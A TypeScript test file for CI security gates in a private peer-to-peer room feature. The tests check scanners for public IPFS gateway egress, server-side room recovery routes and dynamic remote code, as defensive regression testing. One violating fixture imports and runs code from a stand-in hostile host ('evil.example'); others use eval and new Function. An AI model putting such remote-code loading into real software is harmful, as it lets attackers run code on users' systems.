// SPDX-License-Identifier: AGPL-3.0-or-later
//
// WS-S.1.5 — the seven private-room CI gates, proven to BITE.  Each pure
// assertion is fed a CLEAN fixture (→ no violation) and a VIOLATING fixture
// (→ caught), and the marker gates are run over the LIVE apps/api source so a
// future removal of a guard fails CI (PRIVATE_SPEC §23.10).
//
// The column-denylist half of the gate (`checkPrivateServerTables`) is unit
// tested in the `@licio/db` package suite (`private-room-axes.test.ts`), which
// can resolve the Drizzle definitions; this policy-project suite covers the
// pure file-scanning gates + the live-source marker checks.
import { describe, expect, it } from 'vitest';
import {
  apiSource,
  apiSourceFiles,
  findMissingMarkers,
  P2P_ENDPOINT_REJECTION_MARKERS,
  P2P_RANKING_EXCLUSION_MARKERS,
  P2P_SEARCH_EXCLUSION_MARKERS,
  scanDynamicRemoteCode,
  scanNoServerRoomRecovery,
  scanPublicGatewayEgress,
  stripComments,
} from './private-p2p-gates.js';

describe('WS-S.1.5 stripComments', () => {
  it('removes line + block comments but keeps code', () => {
    // A neutral sentinel (deliberately NOT a hostname): this unit only proves
    // comment BODIES are stripped.  The gateway-token-in-a-comment behaviour is
    // covered end to end by the "ignores a public-gateway reference inside a
    // comment" scan test below.
    expect(stripComments('const x = 1; // SENTINEL in a comment').includes('SENTINEL')).toBe(false);
    expect(stripComments('/* uses SENTINEL */ const y = 2;').includes('SENTINEL')).toBe(false);
    expect(stripComments('const z = 3;').includes('z = 3')).toBe(true);
  });
});

describe('WS-S.1.5 check:no-private-cid-egress — public-gateway scan', () => {
  it('passes clean private source', () => {
    expect(scanPublicGatewayEgress([{ path: 'a.ts', content: "const cid = 'bafy...';" }])).toEqual(
      [],
    );
  });

  it('catches a public IPFS gateway URL in code', () => {
    const v = scanPublicGatewayEgress([
      { path: 'b.ts', content: "fetch('https://ipfs.io/ipfs/bafy');" },
    ]);
    expect(v.length).toBeGreaterThan(0);
    expect(v.map((x) => x.detail).join(' ')).toContain('ipfs.io');
  });

  it('ignores a public-gateway reference inside a comment', () => {
    expect(
      scanPublicGatewayEgress([{ path: 'c.ts', content: '// never use ipfs.io for private CIDs' }]),
    ).toEqual([]);
  });
});

describe('WS-S.3.6b §12.7 — no server-side private-room recovery endpoint', () => {
  it('passes clean server source', () => {
    expect(
      scanNoServerRoomRecovery([{ path: 'routes/rooms.ts', content: 'app.post("/v1/rooms", h);' }]),
    ).toEqual([]);
  });

  it('does NOT flag WS-D account recovery (recoverWithCode / recovery_codes)', () => {
    expect(
      scanNoServerRoomRecovery([
        {
          path: 'identity/codes.ts',
          content: 'export function recoverWithCode(recovery_codes) {}',
        },
        { path: 'routes/auth.ts', content: 'app.post("/v1/auth/recovery", handler);' },
      ]),
    ).toEqual([]);
  });

  it('catches a private-room server recovery handler or route', () => {
    expect(
      scanNoServerRoomRecovery([
        { path: 'routes/p.ts', content: 'export async function recoverPrivateRoom(id) {}' },
      ]).length,
    ).toBeGreaterThan(0);
    expect(
      scanNoServerRoomRecovery([
        { path: 'routes/p.ts', content: 'app.post("/private/rooms/:id/recover", handler);' },
      ]).length,
    ).toBeGreaterThan(0);
  });

  it('finds NO recovery endpoint in the live apps/api source', () => {
    expect(scanNoServerRoomRecovery(apiSourceFiles())).toEqual([]);
  });
});

describe('WS-S.1.5 check:private-bundle-transparency — dynamic-remote-code scan', () => {
  it('passes clean private source', () => {
    expect(
      scanDynamicRemoteCode([{ path: 'a.ts', content: 'const x = JSON.parse("1");' }]),
    ).toEqual([]);
  });

  it('catches eval / new Function / a remote dynamic import', () => {
    expect(scanDynamicRemoteCode([{ path: 'a.ts', content: 'eval("1+1");' }]).length).toBe(1);
    expect(
      scanDynamicRemoteCode([{ path: 'b.ts', content: 'new Function("return 1");' }]).length,
    ).toBe(1);
    expect(
      scanDynamicRemoteCode([
        { path: 'c.ts', content: "await import('https://evil.example/x.js');" },
      ]).length,
    ).toBe(1);
  });
});

describe('WS-S.1.5 findMissingMarkers', () => {
  const fakeSource = (rel: string): string => {
    if (rel === 'present.ts') return "if (x.storageMode === 'p2p') reject();";
    if (rel === 'absent.ts') return 'const ok = true;';
    throw new Error('not found');
  };

  it('passes when every marker is present', () => {
    expect(
      findMissingMarkers([{ file: 'present.ts', markers: ["storageMode === 'p2p'"] }], fakeSource),
    ).toEqual([]);
  });

  it('flags a missing marker', () => {
    const v = findMissingMarkers(
      [{ file: 'absent.ts', markers: ["storageMode === 'p2p'"] }],
      fakeSource,
    );
    expect(v.length).toBe(1);
    expect(v[0]?.detail).toContain("storageMode === 'p2p'");
  });

  it('flags a missing file', () => {
    const v = findMissingMarkers([{ file: 'missing.ts', markers: ['x'] }], fakeSource);
    expect(v[0]?.detail).toBe('file not found');
  });
});

describe('WS-S.1.5 the live apps/api source carries every guard (regression catch)', () => {
  it('the endpoint-rejection guards are present', () => {
    expect(findMissingMarkers(P2P_ENDPOINT_REJECTION_MARKERS, apiSource)).toEqual([]);
  });
  it('the ranking-exclusion predicate is present', () => {
    expect(findMissingMarkers(P2P_RANKING_EXCLUSION_MARKERS, apiSource)).toEqual([]);
  });
  it('the search-exclusion predicate is present', () => {
    expect(findMissingMarkers(P2P_SEARCH_EXCLUSION_MARKERS, apiSource)).toEqual([]);
  });
});
